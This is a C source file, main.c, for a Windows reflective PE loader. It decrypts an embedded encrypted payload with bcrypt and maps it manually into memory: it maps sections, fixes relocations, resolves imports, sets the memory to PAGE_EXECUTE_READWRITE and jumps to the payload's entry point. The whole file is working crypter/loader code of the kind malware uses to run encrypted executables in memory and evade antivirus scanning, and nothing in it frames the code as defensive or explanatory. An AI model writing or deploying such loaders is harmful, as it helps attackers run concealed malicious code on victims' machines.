//main.c
#include "../include/common.h"
#include "../payload/payload.h"
int main(int argc, char **argv){

	INT res;
	INSTANCE inst = {0};
	PE_CONTEXT pe_ctx = {0};

	// Initialize pointers to payload data from payload.h
	inst.pPayload = encrypted_pld;
	inst.dwPayloadSize = payload_len;
	inst.pKey = raw_key;
  	inst.pIV = raw_iv; 

	//inst.bIsDebug = TRUE;
	
	// Initialize API resolvers
	res = InitK32(&inst);
	if(res != 0){
		printf("Cannot Initialize kernel32.dll\n");
		return EXIT_FAILURE;
	}

	res = InitBcrypt(&inst);
	if(res != 0){
		printf("Cannot Initialize bcrypt.dll\n");
		return EXIT_FAILURE;
	}

	// Decrypt payload on heap 
	DecryptPayload(&inst);

	pe_ctx.pRawData = inst.pPayload;

	// Initialize PE context
	res = InitPEctx(&pe_ctx);
	if(res != 0){	
		printf("PE context initialization failed\n");
		return EXIT_FAILURE;
	}

	//Allocating address space for payload
	AllocateBase(&pe_ctx, &inst);

	// Mapping sections to allocated space
	res = MapSections(&pe_ctx);
	if(res != 0){
		printf("Section mapping failed\n");
		return EXIT_FAILURE;
	}

	// Fixing base relocations
	res = FixRelocations(&pe_ctx);
	if(res != 0){
		printf("Relocation fixing failed\n");
		return EXIT_FAILURE;
	}

	// Resolving imports
	res = ResolveImports(&pe_ctx, &inst);
	if(res != 0){
		printf("Import resolution failed\n");
		return EXIT_FAILURE;
	}

	// Change memory protection to PAGE_EXECUTE_READWRITE
	DWORD oldProtect;
	if (!inst.kernel32_dll.k32.pVirtualProtect(pe_ctx.pTargetBase, pe_ctx.hds.nt_h->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE, &oldProtect)) {
		printf("VirtualProtect failed\n");
		return EXIT_FAILURE;
	}

	printf("Initialization successful!\n");

	// Launching payload
	// Calculate Entry Point address
	ULONG_PTR pEntryPoint = (ULONG_PTR)pe_ctx.pTargetBase + pe_ctx.hds.nt_h->OptionalHeader.AddressOfEntryPoint;

	printf("Jumping to EntryPoint at: %p\n", (PVOID)pEntryPoint);

	// Define EntryPoint function type
	typedef void (WINAPI* type_EntryPoint)();
	type_EntryPoint pExeMain = (type_EntryPoint)pEntryPoint;

	// Execute payload
	pExeMain();

	return 0;
}
